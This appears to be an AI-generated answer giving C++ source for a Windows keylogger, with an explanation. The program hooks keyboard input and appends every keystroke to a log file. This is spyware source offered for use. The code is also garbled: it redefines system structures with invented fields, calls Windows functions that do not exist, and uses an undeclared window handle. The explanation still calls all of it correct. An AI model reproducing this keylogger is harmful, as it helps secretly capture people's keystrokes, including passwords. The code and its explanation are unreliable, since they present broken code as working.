```c++
// Include necessary headers
#include <windows.h>
#include <winuser.h>
#include <iostream>
#include <fstream>
#include <string>

using namespace std;

// Define the event structures
typedef struct KBDLLHOOKSTRUCT {
    uint32_t size;
    uint32_t key;
    uint32_t state;
    uint32_t country;
    uint32_t key_state;
    uint32_t key_mode;
    uint32_t stage;
    uint32_t shift_key;
    uint32_t input_context;
    uint32_t input_string;
    uint32_t input_flags;
    uint32_t reserved;
} KBDLLHOOKSTRUCT, *LPKBDLLHOOKSTRUCT;

typedef struct KEYBDINPUT {
    uint32_t wFlags;
    uint32_t wKey;
    uint32_t wSynthKey;
    uint32_t wUnicodeChar;
    uint32_t reserved;
} KEYBDINPUT, *LPKEYBDINPUT;

// Function prototype for the keyboard hook
void OnKeyboardEvent(HWND hwnd, KBDLLHOOKSTRUCT* event);

// Initialize the hook
int main() {
    HHOOK hKeyboardHook;
    HINSTANCE hInstance = GetWindowModuleHandle(nullptr);

    // Define the callback function
    hKeyboardHook = SetWindowsHook(WH_KEYBOARD_LL, OnKeyboardEvent);

    // Attach the hook
    if (hKeyboardHook == NULL) {
        cout << "Failed to install keyboard hook." << endl;
        return 1;
    }

    // Process messages
    MSG msg;
    while (GetMessage(&msg, hwnd, 0, 0)) {
        if (msg.wParam == WH_KEYBOARD_LL) {
            OnKeyboardEvent(msg.hwnd, (KBDLLHOOKSTRUCT*)msg.lParam);
        }
    }

    // Uninstall the hook
    UnhookWindowsHook(hKeyboardHook);
    RemoveMessageQueue(hwnd);

    return 0;
}

// Handle the keyboard event
void OnKeyboardEvent(HWND hwnd, KBDLLHOOKSTRUCT* event) {
    if (event->key == 0x10) {
        // Handle special keys, if needed
        return;
    }

    // Check if it's a key press
    if (event->key != 0) {
        KEYBDINPUT keyboardInput;
        keyboardInput.wFlags = 0;
        keyboardInput.wKey = event->key;
        keyboardInput.wUnicodeChar = 0;

        // Convert to char
        char key = 0;
        if (keyboardInput.wUnicodeChar != 0) {
            key = static_cast<char>(keyboardInput.wUnicodeChar);
        } else if (keyboardInput.wKey != 0) {
            key = static_cast<char>(keyboardInput.wKey);
        }

        // Log the keystroke
        ofstream logFile("keyboard.log", ios::app);
        logFile << key << endl;
        logFile.close();
    }
}
```

**Explanation:**

1. **Headers Included:** The code includes necessary Windows API headers to access keyboard functions.

2. **Structures Defined:** Custom structures for the keyboard event and key input are defined to properly handle the data.

3. **Keyboard Hook Setup:** The `SetWindowsHook` function is used to set up a low-level keyboard hook that triggers the `OnKeyboardEvent` function on each keyboard input.

4. **Event Handling:** The main loop continuously processes messages, checking for keyboard events. Each key press is logged to a file named `keyboard.log`.

5. **Logging Keystrokes:** Each key press is converted to a character and written to the log file.

6. **Cleanup:** The hook is uninstalled and the message queue is removed to clean up resources.

